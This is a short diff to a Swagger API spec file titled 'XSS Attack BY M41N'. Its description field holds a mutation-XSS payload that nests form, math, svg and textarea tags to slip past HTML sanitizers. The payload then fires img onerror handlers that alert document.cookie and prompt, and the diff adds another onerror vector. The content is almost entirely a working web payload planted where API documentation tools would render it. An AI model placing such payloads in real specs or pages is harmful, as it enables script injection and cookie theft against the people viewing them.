@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M41N
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1> <img/src/onerror=prompt(8)>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1> <img/src/onerror=prompt(8)> <img src=1 href=1 onerror="javascript:alert(1)"></img>"></form>
 
   version: production
 basePath: /JSSResource/
